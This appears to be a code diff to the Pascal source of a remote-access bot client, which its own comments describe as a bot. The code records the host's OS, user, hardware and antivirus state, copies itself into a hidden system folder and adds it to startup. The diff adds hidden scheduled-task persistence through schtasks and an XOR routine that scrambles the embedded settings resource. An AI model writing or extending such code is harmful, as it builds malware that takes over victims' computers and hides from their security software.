@@ -15,11 +15,16 @@ procedure UpdateResourceSettings(ExeName: String);
 procedure DoFirstRun;
 procedure Restart(ExeName: String; RemoveOldCopy: Boolean = False);
 procedure Initialize;
+procedure ScheduleTask(ATaskName, AFileName, AInterval: String);
+procedure DeleteTask(ATaskName: String);
+function Adler32(Str: String): LongWord;
+procedure ToggleCrypt(var MS: TMemoryStream; Key: Word);
 
 var
   Nick, OS, ComputerName, UserName, CPU, GPU: String;
   AVName, AVState: String;
   Base, FileName, FullName, Server, ID: String;
+  Discriminator: LongWord;
   Delay: LongInt;
 
   MSet:  TMemoryStream;
@@ -27,12 +32,16 @@ var
 
 implementation
 
+const
+  MOD_ADLER = 65521;
+
 var
   Reg: TRegistry;
 
 procedure Initialize;
 Begin
   ID:=GetGUID;
+  Discriminator:=Adler32(ID);
   Nick:=Settings.ReadString('Install', 'Prefix', 'Client-')+LeftStr(ID, Pos('-', ID) - 1);
   Server:=Settings.ReadString('General', 'Server', 'http://localhost');
   Delay:=Settings.ReadInteger('General', 'Delay', 5000);
@@ -47,7 +56,7 @@ Begin
   //Install the bot
   //Establish a base
   if Not(DirectoryExists(Base)) then MkDir(Base);
-  FileSetAttr(Base, faSysFile or faHidden);
+  FileSetAttr(Base, faSysFile{%H-} or faHidden{%H-});
   CopyFile(PChar(ParamStr(0)), PChar(Base+'\'+FileName), False);
   //Add to StartUp
   //Modify the settings
@@ -173,6 +182,19 @@ Begin
   LoadSettings;
 end;
 
+procedure ScheduleTask(ATaskName, AFileName, AInterval: String);
+begin
+  ShellExecute(0, nil, 'schtasks', PChar('/create /tn "' + ATaskName + '" ' +
+    '/tr "' + AFileName + '" /sc '+AInterval),
+    nil, SW_HIDE);
+end;
+
+procedure DeleteTask(ATaskName: String);
+Begin
+  ShellExecute(0, nil, 'schtasks', PChar('/delete /f /tn "' + ATaskName + '"'),
+    nil, SW_HIDE);
+end;
+
 procedure Restart(ExeName: String; RemoveOldCopy: Boolean = False);
 var
   Params: String = '/wait';
@@ -189,6 +211,44 @@ Begin
   Res:=BeginUpdateResource(PChar(ExeName), False);
   UpdateResource(Res, RT_RCDATA, 'Settings', LANG_NEUTRAL, MSet.Memory, MSet.Size);
   EndUpdateResource(Res, False);
+end;
+
+function Adler32(Str: String): LongWord;
+var
+  I: LongInt;
+  A, B: LongWord;
+Begin
+  A:=1;
+  B:=0;
+  For I:=1 to Length(Str) do Begin
+    A:=(A + Ord(Str[I])) mod MOD_ADLER;
+    B:=(B + A) mod MOD_ADLER;
+  end;
+  Result:=(B shl 16) or A;
+End;
+
+procedure ToggleCrypt(var MS: TMemoryStream; Key: Word);
+var
+   InMS: TMemoryStream;
+   cnt: Integer;
+   C: byte;
+begin
+  C:=0;
+  InMS := TMemoryStream.Create;
+  try
+    InMS.CopyFrom(MS, MS.Size);
+    InMS.Position := 0;
+    MS.Clear;
+    for cnt := 0 to InMS.Size - 1 do
+      begin
+        InMS.Read(C, 1) ;
+        C := (C xor not (ord(Key shr cnt)));
+        MS.Write(C, 1) ;
+      end;
+  finally
+    InMS.Free;
+  end;
+  MS.Position:=0;
 end;
 
 end.
